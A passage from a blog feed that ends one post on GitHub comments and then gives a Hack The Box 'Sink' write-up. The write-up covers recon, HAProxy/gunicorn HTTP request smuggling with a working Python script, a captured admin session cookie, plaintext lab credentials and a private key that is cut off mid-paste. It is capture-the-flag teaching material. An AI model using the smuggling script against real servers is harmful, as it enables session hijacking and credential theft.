.<span style="color:#50fa7b">markdown-body</span> .<span style="color:#50fa7b">highlight</span> <span style="color:#ff79c6">pre</span> {
  <span style="color:#ff79c6">word-break</span>: <span style="color:#ff79c6">normal</span>;
}
.<span style="color:#50fa7b">markdown-body</span> <span style="color:#ff79c6">pre</span> {
  <span style="color:#ff79c6">word-wrap</span>: <span style="color:#ff79c6">normal</span>;
}
.<span style="color:#50fa7b">markdown-body</span> <span style="color:#ff79c6">pre</span> {
  <span style="color:#ff79c6">word-wrap</span>: <span style="color:#ff79c6">normal</span>;
}

.<span style="color:#50fa7b">comment-body</span> {
  <span style="color:#ff79c6">font-size</span>: <span style="color:#bd93f9">14</span><span style="color:#8be9fd">px</span>;
}
.<span style="color:#50fa7b">markdown-body</span> {
  <span style="color:#ff79c6">font-family</span>: <span style="color:#ff79c6">-</span>apple-system, BlinkMacSystemFont, Segoe UI, Helvetica, Arial, <span style="color:#ff79c6">sans-serif</span>,
    Apple Color Emoji, Segoe UI Emoji;
  <span style="color:#ff79c6">font-size</span>: <span style="color:#bd93f9">16</span><span style="color:#8be9fd">px</span>;
  <span style="color:#ff79c6">line-height</span>: <span style="color:#bd93f9">1.5</span>;
  <span style="color:#ff79c6">word-wrap</span>: <span style="color:#ff79c6">break-word</span>;
}
.<span style="color:#50fa7b">comment-body</span> {
  <span style="color:#ff79c6">font-size</span>: <span style="color:#bd93f9">14</span><span style="color:#8be9fd">px</span>;
}
.<span style="color:#50fa7b">markdown-body</span> {
  <span style="color:#ff79c6">font-family</span>: <span style="color:#ff79c6">-</span>apple-system, BlinkMacSystemFont, Segoe UI, Helvetica, Arial, <span style="color:#ff79c6">sans-serif</span>,
    Apple Color Emoji, Segoe UI Emoji;
  <span style="color:#ff79c6">font-size</span>: <span style="color:#bd93f9">16</span><span style="color:#8be9fd">px</span>;
  <span style="color:#ff79c6">line-height</span>: <span style="color:#bd93f9">1.5</span>;
  <span style="color:#ff79c6">word-wrap</span>: <span style="color:#ff79c6">break-word</span>;
}
</code></pre></td></tr></table>
</div>
</div><p>And that&rsquo;s it you are all setup! comment down with a link to your site and I&rsquo;ll pay you a visit</p>
<h2 id="recommended-lectures">Recommended lectures:</h2>
<p>Disqus and Github comments:</p>
<ul>
<li><a href="http://donw.io/post/github-comments/">Github comments</a>: beautifully explains why and how to implement privacy friendly comments engine</li>
<li><a href="https://fatfrogmedia.com/delete-disqus-comments-wordpress/">Why I deleted disqus</a></li>
<li><a href="https://crunchify.com/its-time-say-goodbye-to-disqus-comment-system-on-crunchify/">it&rsquo;s time to say goodbye to disqus</a></li>
</ul>
<p>Github actions:</p>
<ul>
<li><a href="https://www.morling.dev/blog/automatically-deploying-hugo-website-via-github-actions/">Automatically deploy a hugo website with github-actions</a></li>
<li><a href="https://medium.com/@asishrs/automate-your-github-pages-deployment-using-hugo-and-actions-518b959a51f9">Automate your github pages deployment with hugo and actions </a></li>
<li><a href="https://brennerm.github.io/posts/trigger-github-actions-on-pr-close.html">trigger github actions on pr close</a></li>
<li><a href="https://stackoverflow.com/questions/59588605/how-to-check-for-a-label-in-a-github-action-condition">how to check for a label in a github action condition</a></li>
<li><a href="https://github.com/peaceiris/actions-hugo">peaceiris/actions-hugo</a></li>
</ul>
<p>Get Started:</p>
<ul>
<li><a href="https://gohugo.io/getting-started/quick-start/">Get started with a static website in hugo</a></li>
<li><a href="https://pages.github.com/">Get started with github pages</a></li>
</ul>
<p>Git kung-fu miscellaneous:</p>
<ul>
<li><code>ssh -vT git@github.com</code>: to check which user is authentifying / connectivity issues</li>
<li><a href="https://www.git-tower.com/learn/git/faq/git-squash/">How to squash commits</a></li>
<li><a href="https://crunchify.com/how-to-set-github-user-name-and-user-email-per-repository-different-config-for-different-repository/">how to set github user.name and user.email per repository different config for different repository</a></li>
</ul>
]]></content></item><item><title>HTB - Sink</title><link>https://0xade1.github.io/posts/2021/09/htb-sink/</link><pubDate>Mon, 20 Sep 2021 00:54:12 +0800</pubDate><guid>https://0xade1.github.io/posts/2021/09/htb-sink/</guid><description>nmap 1 2 3 4 5 sudo nmap -p- --min-rate=3000 10.10.10.225 -v PORT STATE SERVICE 22/tcp open ssh 3000/tcp open ppp 5000/tcp open upnp port 3000/TCP Gitea 1.12.6 which is above vulnerable version in searchsploit
Exploration finds:
3 users: marcus, david and root 1 organization:: Sink_Solutions port 5000/TCP There is a R
In the response header we can notice:
1 2 Server: gunicorn/20.0.0 Via: haproxy My JWT Cookies translate to:</description><content type="html"><![CDATA[<h1 id="nmap">nmap</h1>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">sudo nmap -p- --min-rate<span style="color:#ff79c6">=</span><span style="color:#bd93f9">3000</span> 10.10.10.225 -v
PORT STATE SERVICE
22/tcp open ssh
3000/tcp open ppp
5000/tcp open upnp
</code></pre></td></tr></table>
</div>
</div><h1 id="port-3000tcp">port 3000/TCP</h1>
<p>Gitea 1.12.6 which is above vulnerable version in searchsploit</p>
<p>Exploration finds:</p>
<ul>
<li>3 users: <code>marcus</code>, <code>david</code> and <code>root</code></li>
<li>1 organization:: Sink_Solutions</li>
</ul>
<h1 id="port-5000tcp">port 5000/TCP</h1>
<p>There is a R</p>
<p>In the response header we can notice:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http">Server: gunicorn/20.0.0
Via: haproxy
</code></pre></td></tr></table>
</div>
</div><p>My JWT Cookies translate to:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#8be9fd;font-style:italic">eyJlbWFpbCI6InRlc3RAc2luay5odGIifQ</span><span style="color:#ff79c6">==</span> | base64 -d
<span style="color:#ff79c6">{</span><span style="color:#f1fa8c">&#34;email&#34;</span>:<span style="color:#f1fa8c">&#34;test@sink.htb&#34;</span><span style="color:#ff79c6">}</span>
</code></pre></td></tr></table>
</div>
</div><p>Searchsploit has no exploit on gunicorn; cvedetails and Mitre do a very poor job to identify a vulnerability while <a href="https://snyk.io/vuln/search?q=gunicorn&amp;type=any">Snyk.io</a> find an <a href="https://portswigger.net/web-security/request-smuggling">http request smuggling</a> vulnerability which affects gunicorn-20.0.0 and documented. It is confirmed by the <a href="https://docs.gunicorn.org/en/stable/2019-news.html">2019 changelog</a></p>
<p>There is a bug where haproxy and gunicorn do not handle in the same way discrepancies between Content-Length and Trans-Encoding headers resuting in htt request smuggling. The gunicorn team discuss how to fix the Trans-Encoding in <a href="https://github.com/benoitc/gunicorn/issues/2176">this issue</a> while <a href="https://nathandavison.com/blog/haproxy-http-request-smuggling">this blog explains the exploitation of haproxy</a></p>
<h1 id="http-smuggling-background">Http smuggling background</h1>
<p>This video: <a href="https://www.youtube.com/watch?v=nq0ndhkfV_M">HTTP Request smuggling explain | HAProxy HTTP Request smuggling Vulnerability | CVE-2019-18277 POC</a> resumes how to perform the attack.</p>
<p>When sending to HAProxy <code>\x0b</code> (vertical tab) or <code>\x0c</code> (form feed) in Transfer-Encoding header:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http">Transfer-Encoding:\x0bchunked
[...]
0
</code></pre></td></tr></table>
</div>
</div><p>it results in HAProxy sending to the backend the following, with chunked being on the next line, and therefore the Transfer-Encoding may be ignore by backend and Content-Length will take priority and be used instead.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http">Transfer-Encoding:
	chunked
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#!/usr/bin/env python3</span>

<span style="color:#ff79c6">import</span> socket
<span style="color:#6272a4">#import time</span>


host <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;10.10.10.225&#34;</span>
port <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">5000</span>

body <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;&#34;&#34;0
</span><span style="color:#f1fa8c">
</span><span style="color:#f1fa8c">POST /notes HTTP/1.1
</span><span style="color:#f1fa8c">Host: </span><span style="color:#f1fa8c">{</span>host<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">:</span><span style="color:#f1fa8c">{</span>port<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">
</span><span style="color:#f1fa8c">Referer: http://10.10.10.225:5000/notes
</span><span style="color:#f1fa8c">Content-Type: text/plain
</span><span style="color:#f1fa8c">Content-Length: 50
</span><span style="color:#f1fa8c">Cookie: session=eyJlbWFpbCI6InRlc3RAc2luay5odGIifQ.YUcHyA.wQ6Ax3aTu5om6KI1Zq2HRv2igqs
</span><span style="color:#f1fa8c">
</span><span style="color:#f1fa8c">note=&#34;&#34;&#34;</span><span style="color:#ff79c6">.</span>replace(<span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>,<span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\r\n</span><span style="color:#f1fa8c">&#39;</span>)

header <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;&#34;&#34;GET / HTTP/1.1
</span><span style="color:#f1fa8c">Host: </span><span style="color:#f1fa8c">{</span>host<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">:</span><span style="color:#f1fa8c">{</span>port<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">
</span><span style="color:#f1fa8c">Content-Length: </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">len</span>(body)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">
</span><span style="color:#f1fa8c">Transfer-Encoding: </span><span style="color:#f1fa8c">\x0b</span><span style="color:#f1fa8c">chunked
</span><span style="color:#f1fa8c">
</span><span style="color:#f1fa8c">&#34;&#34;&#34;</span><span style="color:#ff79c6">.</span>replace(<span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>,<span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\r\n</span><span style="color:#f1fa8c">&#39;</span>)

request <span style="color:#ff79c6">=</span> (header <span style="color:#ff79c6">+</span> body)<span style="color:#ff79c6">.</span>encode()

<span style="color:#ff79c6">with</span> socket<span style="color:#ff79c6">.</span>socket(socket<span style="color:#ff79c6">.</span>AF_INET, socket<span style="color:#ff79c6">.</span>SOCK_STREAM) <span style="color:#ff79c6">as</span> s:
    s<span style="color:#ff79c6">.</span>connect((host, port))
    s<span style="color:#ff79c6">.</span>send(request)
    <span style="color:#6272a4"># time.sleep(5000)</span>
</code></pre></td></tr></table>
</div>
</div><p>This creates a note with the incomplete content of <code>GET /notes/delete/1234 HTTP/1.1 Host: 127.0.</code></p>
<p>We can extend the size of the body <code>Content-Length: 300</code> and we obtain a bigger response:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http">GET /notes/delete/1234 HTTP/1.1 Host: 127.0.0.1:8080 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 Accept-Encoding: gzip, deflate Accept: */* Cookie: session=eyJlbWFpbCI6ImFkbWluQHNpbmsuaHRiIn0.YUW01A.pqOgH-VWwZ97y9e3R8k5Amv9d70 X-Forwarded-For: 127.0.0.1
</code></pre></td></tr></table>
</div>
</div><p>jwt.io or base64 can help identify its admin cookie:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#8be9fd;font-style:italic">eyJlbWFpbCI6ImFkbWluQHNpbmsuaHRiIn0</span><span style="color:#ff79c6">=</span> | base64 -d
<span style="color:#ff79c6">{</span><span style="color:#f1fa8c">&#34;email&#34;</span>:<span style="color:#f1fa8c">&#34;admin@sink.htb&#34;</span><span style="color:#ff79c6">}</span>
</code></pre></td></tr></table>
</div>
</div><p>we can replace with the admin cookies and we can access 3 notes:</p>
<table>
<thead>
<tr>
<th>id</th>
<th>Note</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>Chef Login : <a href="http://chef.sink.htb">http://chef.sink.htb</a> Username : chefadm Password : /6&rsquo;fEGC&amp;zEx{4]zz</td>
</tr>
<tr>
<td>2</td>
<td>Dev Node URL : <a href="http://code.sink.htb">http://code.sink.htb</a> Username : root Password : FaH@3L&gt;Z3})zzfQ3</td>
</tr>
<tr>
<td>3</td>
<td>Nagios URL : <a href="https://nagios.sink.htb">https://nagios.sink.htb</a> Username : nagios_adm Password : g8&lt;H6GK{*L.fB3C</td>
</tr>
</tbody>
</table>
<p>The second note credentials works to login Gitea on port 3000</p>
<h1 id="shell-as-marcus">Shell as Marcus</h1>
<p>After login in Gitea, we find 15 commits and 4 repositories to explore. There is one commit by <code>marcus</code> with comment: <code>Adding EC2 Key Management Structure</code> which contains a private key that we can copy as id_private.sink.htb.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;-----BEGIN OPENSSH PRIVATE KEY-----
</span><span style="color:#f1fa8c">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
</span><span style="color:#f1fa8c">NhAAAAAwEAAQAAAYEAxi7KuoC8cHhmx75Uhw06ew4fXrZJehoHBOLmUKZj/dZVZpDBh27d
</span><span style="color:#f1fa8c">Pogq1l/CNSK3Jqf7BXLRh0oH464bs2RE9gTPWRARFNOe5sj1tg7IW1w76HYyhrNJpux/+E
</span><span style="color:#f1fa8c">o0ZdYRwkP91+oRwdWXsCsj5NUkoOUp0O9yzUBOTwJeAwUTuF7Jal/lRpqoFVs8WqggqQqG
</span><span style="color:#f1fa8c">EEiE00TxF5Rk9gWc43wrzm2qkrwrSZycvUdMpvYGOXv5szkd27C08uLRaD7r45t77kCDtX
</span><span style="color:#f1fa8c">4ebL8QLP5LDiMaiZguzuU3XwiNAyeUlJcjKLHH/qe5mYpRQnDz5KkFDs/UtqbmcxWbiuXa
</span><span style="color:#f1fa8c">JhJvn5ykkwCBU5t5f0CKK7fYe5iDLXnyoJSPNEBzRSExp3hy3yFXvc1TgOhtiD1Dag4QEl
</span><span style="color:#f1fa8c">0DzlNgMsPEGvYDXMe7ccsFuLtC+WWP+94ZCnPNRdqSDza5P6HlJ136ZX34S2uhVt5xFG5t
</span><span style="color:#f1fa8c">TIn2BA5hRr8sTVolkRkLxx1J45WfpI/8MhO+HMM/AAAFiCjlruEo5a7hAAAAB3NzaC1yc2
</span><span style="color:#f1fa8c">EAAAGBAMYuyrqAvHB4Zse+VIcNOnsOH162SXoaBwTi5lCmY/3WVWaQwYdu3T6IKtZfwjUi
</span><span style="color:#f1fa8c">tyan+wVy0YdKB+OuG7NkRPYEz1kQERTTnubI9bYOyFtcO+h2MoazSabsf/hKNGXWEcJD/d
</span><span style="color:#f1fa8c">fqEcHVl7ArI+TVJKDlKdDvcs1ATk8CXgMFE7heyWpf5UaaqBVbPFqoIKkKhhBIhNNE8ReU
</span><span style="color:#f1fa8c">ZPYFnON8K85tqpK8K0mcnL1HTKb2Bjl7+bM5HduwtPLi0Wg+6+Obe+5Ag7V+Hmy/ECz+Sw
</span><span style="color:#f1fa8c">4jGomYLs7lN18IjQMnlJSXIyixx/6nuZmKUUJw8+SpBQ7P1Lam5nMVm4rl2iYSb5+cpJMA
</span><span style="color:#f1fa8c">gVObeX9Aiiu32HuYgy158qCUjzRAc0UhMad4ct8hV73NU4DobYg9Q2oOEBJdA85TYDLDxB
</span><span style="color:#f1fa8c">r2A1zHu3HLBbi7Qvllj/veGQpzzUXakg82uT+h5Sdd+mV9+EtroVbecRRubUyJ9gQOYUa/
</span><span style="color:#f1fa8c">LE1aJZEZC8cdSeOVn6SP/DITvhzDPwAAAAMBAAEAAAGAEFXnC/x0i+jAwBImMYOboG0HlO
</span><span style="color:#f1fa8c">z9nXzruzFgvqEYeOHj5DJmYV14CyF6NnVqMqsL4bnS7R4Lu1UU1WWSjvTi4kx/Mt4qKkdP
